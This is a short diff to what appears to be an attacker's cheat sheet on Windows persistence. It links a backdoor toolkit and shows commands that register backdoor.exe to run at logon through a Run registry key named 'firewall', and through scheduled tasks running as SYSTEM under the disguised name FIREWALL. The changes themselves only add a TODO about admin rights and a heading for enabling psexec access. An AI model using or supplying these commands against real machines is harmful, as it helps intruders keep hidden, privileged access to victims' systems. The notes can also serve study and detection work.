@@ -1,6 +1,8 @@
 # Persistence on Windows
 ;; Useful toolkit: https://github.com/gnebbia/Introtobackdoors/tree/master/toolkits/windows7
 
+!! TODO: Add to everything if you need ADMIN or not
+
 # Launch Commands at startup
 ;;  Startup Directories
 
@@ -119,3 +121,6 @@ PS C:\> Register-ScheduledTask Backdoor -InputObject $D
 REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v firewall /t REG_SZ /d  "C:\windows\System32\backdoor.exe" /f
 at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
 schtasks /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\backdoor.exe" /ED 12/12/2020
+
+
+# Enable psexec access (requires Administrator)
